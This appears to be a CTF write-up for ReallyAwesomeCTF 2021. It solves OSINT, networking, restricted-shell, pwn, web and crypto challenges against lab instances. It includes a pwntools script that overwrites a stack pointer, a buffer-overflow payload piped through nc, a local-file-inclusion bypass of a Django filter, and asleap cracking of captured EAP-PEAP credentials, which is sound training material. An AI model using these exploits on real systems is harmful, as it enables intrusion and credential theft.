# ReallyAwesomeCTF 2021

ReallyAwesomeCTF 2021, from August 13 3PM - August 16 3PM (EDT).

## Overview

Writeups to challenges are linked here, arranged by points.

Challenge | Category | Points | Solves | Comments
--------- | -------- | ------ | ------ | --------
[Discord](#Discord-Miscellaneous-50-pts) | Miscellaneous | 50 | 433 | Sanity check
[Skyline](#OSINT) | OSINT | 100 | 243
[Triangles](#OSINT) | OSINT | 100 | 451
[RSFPWS - Intercepted](#RSFPWS---Intercepted-Miscellaneous-150-pts) | Miscellaneous | 150 | 99
[Silver Darlings](#OSINT) | OSINT | 150 | 325
[Call&Response](#CallResponse-Miscellaneous-200-pts) | Miscellaneous | 200 | 123
[John Poet](#OSINT) | OSINT | 200 | 285
[OHSHINT](#OSINT) | OSINT | 200 | 172
[50m on the Right](#OSINT) | OSINT | 250 | 300
[Missing Tools](#Missing-Tools-Miscellaneous-250-pts) | Miscellaneous | 250 | 165
[Absolute Dice](#Absolute-Dice-PwnReversing-300-pts) | Pwn/Reversing | 300 | 74
[Dodgy Databases](#Dodgy-Databases-PwnReversing-350-pts) | Pwn/Reversing | 350 | 117
[Emojibook](#Emojibook-Web-350-pts) | Web | 350 | 133
[Lego Car Generator](#Lego-Car-Generator-PwnReversing-350-pts) | Pwn/Reversing | 350 | 54
Packed | Pwn/Reversing | 350 | 56

## Writeups

## Discord (Miscellaneous, 50 pts)

### Description

Come join our [Discord](https://discord.gg/Rrhdvzn)!

### Solution

I swear I spent way too much time on it because I looked at all the channel descriptions *except for* #general channel. I still don't know how I missed it for so long. But here it is:

![image](https://user-images.githubusercontent.com/11196638/129629365-f4a05b69-ebde-4cbb-884b-a1e624815a18.png)

### Flag
```
ractf{so_here_we_are_again}
```

## OSINT

Challenge | Location Link | Explanation
--------- | ------------- | -----------
[Triangles](OSINT_images/triangles.jpg) | https://goo.gl/maps/qr7Qbriw2egc8SFBA | Ragusa Foto Festival; in the left down corner, there's a sign with Palazzo Cosentini, etc...
[Skyline](OSINT_images/skyline.jpg) | https://goo.gl/maps/ycHeJL72VyLpFAp97 | Go along London's river, look for two towers and a zipline, with a small river that goes off the side
[Silver Darlings](OSINT_images/silver_darlings.jpg) | https://goo.gl/maps/tgKfk3gWUrgwoEJaA | Cafe de la Mairie, Chambres dhotes
[John Poet](OSINT_images/john_poet.jpg) | https://goo.gl/maps/kofmRvGnRvNGPCQD8 | RHC, glass buildings, parasol; Rail House Cafe
[50m on the Right](OSINT_images/50m_on_the_right.jpg) | https://goo.gl/maps/iwo1hcwe5Sr592RJ8 | on the sign, Bistro 24; also you can *barely* read armacao de pera under the logo
[OHSHINT](OSINT_images/image.jpg) | https://goo.gl/maps/Q9AavYfW8HoxFZHA8 | hint in the metadata of image; look for a big lake northeast of Lancaster; pine lake

## RSFPWS - Intercepted (Miscellaneous, 150 pts)

## Description

Challenge instance ready at `193.57.159.27:35582`. Click here to request a new instance.  
This challenge also has something on port 35582/udp

This game i'm playing is fun! There's this box that seemingly does nothing though... It sends a "network request" whatever that is. Can you have a look?  
(When the game launches, enter the IP and port you get from above. This challenge uses the same files and instance as other RSFPWS challenges)

### Attachments

[`windows_clinet.zip`](windows_clinet.zip)

[`linux_client.zip`](linux_client.zip)

### Solution

The file given is a unity game. Upon running it and logging in with the given IP address and port, we see:

![image](https://user-images.githubusercontent.com/11196638/129629507-54ca736b-51bb-4f02-a8ac-024f40229e8e.png)

There are 3 challenges in this game; this one seems to be related to the rightmost one:

![image](https://user-images.githubusercontent.com/11196638/129629604-c45c2625-8f29-4b56-9a67-b18ef65bc763.png)

The challenge also mentions that there's something at the udp port. We'll try wiresharking to capture the packet when I enter the box:

![rsfpws-intercepted](https://user-images.githubusercontent.com/11196638/129629734-e4544dac-0c70-48bb-9bd6-ca3bd15b4312.PNG)

Nice.

### Flag
```
ractf_N3tw0rking_L`ke_4_B0ss!}
```

## Call&Response (Miscellaneous, 200 pts)

### Description

Agent,

We're working a major case. We've been called in to covertly investigate a foreign govt agency, the GDGS, by a private organisation. We've finished performing initial reconnaissance of the target building and it's surrounding areas. We know they have a wireless network which they use to carry out live activities. Gaining access here would be substiantial. Problem is, they've somewhat competently secured it using WPA2 EAP-PEAP authentication which means gaining a packet capture of the handshake process is useless as the authentication exchange is carried out over a TLS 1.2 session. Nonetheless, we setup an access point with same ESSID as the target and managed to trick an employee's device into attempting to connect to our AP. In the process, we've obtained an username and certain auth values. We're not entirely sure what we need to do with them.

Can you take a look and help us recover the password?
```
username:    PrinceAli
c:    c3:ae:5e:f9:dc:0e:22:fb
r:    6c:52:1e:52:72:cc:7a:cb:0e:99:5e:4e:1c:3f:ab:d0:bc:39:54:8e:b0:21:e4:d0
```
Flag format is `ractf{recovered_password}`.

### Solution

I don't know much about WPA2 EAP-PEAP or TLS, but some google search related to WPA2 EAP-PEAP authentication and call and response gives [this](https://solstice.sh/ii-attacking-and-gaining-entry-to-wpa2-eap-wireless-networks/). Based on it, we'll try `asleap`:

![image](https://user-images.githubusercontent.com/11196638/129631307-7acc4ad3-046e-4a3a-8eba-31b440c02259.png)

Noice.

### Flag
```
ractf{rainbow6}
```

## Missing Tools (Miscellaneous, 250 pts)

### Description

Challenge instance ready at `193.57.159.27:42380`. Click here to request a new instance.

Man, my friend broke his linux install pretty darn bad. He can only use like, 4 commands. Can you take a look and see if you can recover at least some of his data?

Username: `ractf`  
Password: `8POlNixzDSThy`  
Note: it may take a minute or more for your container to start depending on load

### Solution

After ssh'ing in, we see a restricted shell. This shell doesn't even allow `ls`. I tested for things that would work:

```
baba@baba:~$ ssh -p 42380 ractf@193.57.159.27
ractf@193.57.159.27's password:
Linux restricted shell
$ cat
This command has been disabled by your administrator.
$ ls
This command has been disabled by your administrator.
$ vi
This command has been disabled by your administrator.
$ pwd
/home/ractf
$ echo

$ cd
$ .
.: Needs 1 argument
```

Huh? What does a `.` do? Apparently it's a [`source`](https://ss64.com/bash/source.html) command that executes commands from the input file. Interesting.

We still don't know what we have in the current directory. Fortunately, we have a poor-man's `ls`: [`echo *`](https://superuser.com/questions/901183/who-deals-with-the-star-in-echo)

```
$ echo *
flag.txt
$ . flag.txt
.: ractf{std0ut_1s_0v3rr4ted_spl1t_sha}: No such file or directory
```

Thanks, bash, for the detailed error message.

### Flag
```
ractf{std0ut_1s_0v3rr4ted_spl1t_sha}
```

## Absolute Dice (Pwn/Reversing, 300 pts)

### Description

Challenge instance ready at `193.57.159.27:35383`. Click here to request a new instance.

Man, the final boss of this game is kickin' my ass! Can you give me a hand?

### Attachment

[`AbsoluteDice`](AbsoluteDice)

### Solution

After [painstakingly trying to figure out](ADsol.png) what this does, I think this is what the program is doing (please bear with me writing pseudocode in python + c):

```
int inp_array[33];
int i = 0
while(i < 100):
  i += 1
  fread(&seed, 4, 1, fopen("/dev/urandom", "r"))
  srand(seed)
  inp = input("Enter your guess> ")
  ad_roll = rand() % 21
  inp_array[i % 33] = inp
  /* code checking if input is correct 31 consecutive times */
```

I also noticed that the program always segfaults on the 32nd or 33rd input. That's strange. Looking at it from `gdb`, it crashes when it tries to call `fread` on file descriptor `0`, which means `fopen` returned `NULL`. And `fopen` seems to have tried to read from address that I had input previously.

Looking into it a little more:

- `ebp-0x10` stores the address of string `/dev/urandom`.
- The `inp_array` stores its value from `ebp-0x90` to `ebp-0x10`.
- The first value will be stored at `inp_array[1]`, not at index `0`.

So the 32nd input will write at `ebp-0x10`, where it used to have the address of `'/dev/urandom'`, replacing it with out input. 4-bytes from `/dev/urandom` are used as the seed to `srand` every loop, so if we can overwrite it with an existing file that is not random, we can seed random with the same value everytime. For this, I chose `'flag.txt'` within the file, which is at `0x8048bb9`. Luckily, the binary has no PIE.

At this point, it's trivial; on the 32nd input, we give `134515641` (the decimal value for `0x8048bb9`), and figure out what "random" value it produces (it produced 11); then, rerun the program, give the same 32nd input, and repeat that "random" value 31 times. As a side note, unlike the output which seems to require 50 consecutive correct inputs, the actual code only checks 31 times.

```py
import pwn

io = pwn.remote('193.57.159.27', 35383)
FLAG_ADDR = b'134515641'
for _ in range(31):
    io.sendline(b'1')
io.sendline(FLAG_ADDR)
io.recvline()
for _ in range(31):
    io.sendline(b'11')
io.interactive()
```
```
$ python3 dice.py
[+] Opening connection to 193.57.159.27 on port 35383: Done
[*] Switching to interactive mode

Enter your guess> Absolute Dice scores a hit on you! (She had 7, you said 1)
Enter your guess> Absolute Dice scores a hit on you! (She had 17, you said 1)
...
Enter your guess> Absolute Dice scores a hit on you! (She had 9, you said 1)
Enter your guess> Absolute Dice scores a hit on you! (She had 15, you said 134515641)
Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (1/50)
Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (2/50)
...
Enter your guess> Absolute Dice shrieks as your needle strikes a critical hit. (31/50)
Absolute Dice shrieks as you take her down with a final hit.ractf{Abs0lute_C0pe--Ju5t_T00_g00d_4t_th1S_g4me!}
```

Flage.

### Flag
```
ractf{Abs0lute_C0pe--Ju5t_T00_g00d_4t_th1S_g4me!}
```

## Dodgy Databases (Pwn/Reversing, 350 pts)

### Description

Challenge instance ready at `193.57.159.27:44340`. Click here to request a new instance.
One of our most senior engineers wrote this database code, it's super well commented code, but it does seem like they have a bit of a god complex. See if you can help them out.

### Attachment

[`challenge.zip`](challenge.zip)

### Solution

We're conveniently given the source code. Reading through it, there's a `GOD` role with the value of `0xBEEFCAFE`; when `users_register_user` is called, if  the `admin` is `ROLE_GOD`, then it will print out the flag. While the only input we give is the user to register, we can also see that the input username is 30 characters long, whereas the `User` struct has `name[USERNAME_LEN]; Role role;`. `USERNAME_LEN` is 20, so we can just overwrite the `role` with the value of `ROLE_GOD`.

```
$ echo -e 'AAAAAAAAAAAAAAAAAAAA\xfe\xca\xef\xbe' | nc 193.57.159.27 44340
Hi, welcome to my users database.
Please enter a user to register: ractf{w0w_1_w0nD3r_wH4t_free(admin)_d0e5}
```

Neato.

### Flag
```
ractf{w0w_1_w0nD3r_wH4t_free(admin)_d0e5}
```

## Emojibook (Web, 350 pts)

### Description

Challenge instance ready at `193.57.159.27:25730`. Click here to request a new instance.

![image](https://user-images.githubusercontent.com/11196638/129639564-c4a92a59-abcf-4aaa-8860-816fa06e329c.png)

The flag is at `/flag.txt`

### Attachment

[`src.zip`](src.zip)

### Solution

![image](https://user-images.githubusercontent.com/11196638/129639652-a7c87042-61f7-41a4-9be1-6b137aeb31a7.png)

Attempting to create a new note gives error 500, so we register and login. The `New Note` tab let's us create a note with a title and a body. Let's look at the source file given.

Reading through `notes/views.py`, this section looks interesting:

```py
def view_note(request: HttpRequest, pk: int) -> HttpResponse:
    note = get_object_or_404(Note, pk=pk)
    text = note.body
    for include in re.findall("({{.*?}})", text):
        print(include)
        file_name = os.path.join("emoji", re.sub("[{}]", "", include))
        with open(file_name, "rb") as file:
            text = text.replace(include, f"<img src=\"data:image/png;base64,{base64.b64encode(file.read()).decode('latin1')}\" width=\"25\" height=\"25\" />")

    return render(request, "note.html", {"note": note, "text": text})
```

This searches for the body of the note with regex `({{.*??}})`, which is something in the form `"{{" + (anything) + "}}"`; then it does a `os.path.join("emoji", re.sub("[{}]", "", include)`, attempting to get the emoji path after removing braces from the previously searched string. A [quick read on `os.path.join`](https://docs.python.org/3/library/os.path.html#os.path.join) tells us that if there's an absolute address in the middle, it will discard everything previously and use that absolute address as base. With the file name achieved from the os.path.join call, it opens that file and base64 encodes it, and wraps it in the `<img>` tag. Now it's simple, just do {{/flag.txt}} and look at source to get the base64 of the flag, right?

No. Well, sort of. In `notes/forms.py`, we actually see that the braces in the input are removed when it saves the note:
```
def save(self, commit=True):
    instance = super(NoteCreateForm, self).save(commit=False)
    instance.author = self.user
    instance.body = instance.body.replace("{{", "").replace("}}", "").replace("..", "")

    with open("emoji.json") as emoji_file:
        emojis = json.load(emoji_file)

        for emoji in re.findall("(:[a-z_]*?:)", instance.body):
            instance.body = instance.body.replace(emoji, "{{" + emojis[emoji.replace(":", "")] + ".png}}")
```

But it does it in a bad way. Using the fact that it also removes "..", we just do this: `{..{/flag.txt}..}`

Decoding with base64 gives the flag.

*This was apparently an unintended solution due to a mistake in setting the docker file. The challenge as intended would not give us access to the flag, and is the Emojibook 2 challenge.*

### Flag
```
ractf{dj4ng0_lfi}
```

## Lego Car Generator (Pwn/Reversing, 350 pts)

### Description

I encrypted the flag with this program into `secret`. But then I accidentally lost the original file! Can you help me recover the flag please?

### Attachments

[`secret`](secret)  
[`encrypter`](encrypter)

### Solution

The encrypter takes an input file and an output file, and works as such: it gets a 4-byte random number, and xors it with 4 bytes from the input. A new "random" number is then generated from `rngNext32`, and repeats the process until the end. `rngNext32` totally produces a random number, I swear!

```
void rngNext32(int *param_1)
{
  *param_1 = *param_1 * 0x17433a5b + -0x481e7b5d;
  return;
}
```
(from ghidra)

Yes, very random.

Well, we already know the first 6 bytes of the flag, `ractf{`. Since this encryption is just xor's, we can figure out the seed used by xoring `ract` with the 4 bytes of the encrypted flag. After figuring out the seed, we can just reverse it by xoring the totally-random-number we know from the seed, with the encrypted flag.

```py
with open('secret', 'rb') as f:
    get_seed = True
    data = f.read(4)
    flag = b'ract'
    seedb = b''
    while data:
        if get_seed:    # figure out seed
            for i in range(4):
                seedb += (flag[i]^data[i]).to_bytes(1,'big')
            seed = int.from_bytes(seedb, 'big')
            get_seed = False
        else:           # get flag
            seedb = seed.to_bytes(4, 'big')
            for i in range(len(data)):
                flag += (seedb[i]^data[i]).to_bytes(1,'big')
        seed = (seed*0x17433a5b-0x481e7b5d)&0xFFFFFFFF
        data = f.read(4)
print(flag)
```
```
$ python3 lcg.py
b'ractf{CL04K_3NGa6ed}sikeyouthoughttheflagwasthislong\n\xea'
```

Welp, apparently the flag wasn't that long.

### Flag
```
'ractf{CL04K_3NGa6ed}
```
